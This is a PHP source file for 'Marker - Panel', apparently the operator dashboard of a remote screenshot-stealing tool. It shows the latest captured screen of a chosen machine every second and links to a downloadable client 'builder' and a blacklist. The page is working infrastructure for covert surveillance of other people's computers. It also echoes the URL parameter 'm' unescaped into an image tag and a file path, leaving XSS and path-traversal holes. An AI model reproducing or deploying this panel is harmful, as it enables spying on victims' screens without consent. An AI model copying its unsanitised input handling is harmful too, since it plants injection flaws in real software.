<?php
session_start();
include('api/api.php');
if (isset($_SESSION['csrftoken'])) {
    if (check_login($_SESSION['csrftoken']) == false) { header('location: index.php'); }
} else { header('location: index.php'); }
if (!isset($_GET['m'])) {
    header('location: panel.php');
}
?>
<html>
    <head>
        <title>Marker - Panel</title>
        <meta charset="utf-8">
        <meta name="robots" content="noodp"/>
        <meta property="og:locale" content="ar_AR" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="X-UA-Compatible" content="IE=8" />
        <meta name="theme-color" content="#cccccc" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="Content-Script-Type" content="text/javascript" />
        <link type="text/css" rel="stylesheet" href="style.css">
        <script src="linked/a5794e9cdf.js"></script>
        <script src="linked/jquert-3.2.1.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                var xmlFile = 'ss/<?php echo htmlspecialchars($_GET['m']); ?>.jpg';
                var parseFoo;
                var reportFooFail;
                $.ajaxSetup({cache: false});
                window.setInterval(function(){
                    $.ajax({
                        type: "GET",
                        async: true,
                        timeout: 5000,
                        url : xmlFile,
                        success: function(data, textStatus, request){
                            document.getElementById('date').innerHTML = 'Last Screenshot : ' + request.getResponseHeader("Last-Modified");
                        }
                    });
                    $('img').attr('src', 'ss/<?php echo htmlspecialchars($_GET['m']); ?>.jpg?timestamp=' + new Date().getTime());
                }, 1000);
            });
        </script>
    </head>
    <body>
        <section class="head">
            <a href="panel.php">Home</a>
            <a href="setting.php">Setting</a>
            <a href="blacklist.php">Black List</a>
            <a href="api/builder.rar">Donwload Builder</a>
            <a href="logout.php">Logout</a>
        </section><br>
        <section class="screenshot" style="font-size: 13px; font-family: Tahoma;">
            <h id="date">Last Screenshot :</h><br>
            <?php
            if (file_exists('ss/'.$_GET['m'].'.jpg')) {
            ?>
            <img width="100%" height="100%" src="<?php echo 'ss/'.$_GET['m'].'.jpg'; ?>">
            <?php
            } else { echo '<h style="color: red; font-size: 13; font-family: Tahoma;">No Screen available !</h>'; }
            ?>
        </section>
    </body>
</html>